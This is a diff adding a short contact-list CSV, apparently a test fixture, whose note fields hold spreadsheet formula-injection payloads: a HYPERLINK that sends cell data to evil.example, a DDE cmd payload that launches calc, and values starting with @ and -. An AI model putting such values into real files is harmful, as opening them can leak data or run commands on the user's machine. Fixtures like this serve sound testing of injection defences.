@@ -1,0 +1,6 @@
+name,company,email,note
+Maria Lopez,Brightside Ltd,maria@brightside.example,=HYPERLINK("http://evil.example/steal?d="&A1,"Click here")
+Tom Becker,Northwind GmbH,tom@northwind.example,+SUM(1+1)*cmd|' /C calc'!A0
+Aiko Tanaka,Sakura KK,aiko@sakura.example,@SUM(1+9)
+Leo Grant,Grant & Sons,leo@grant.example,-2+3
+Nadia Haddad,Cedar Labs,nadia@cedar.example,prefers email
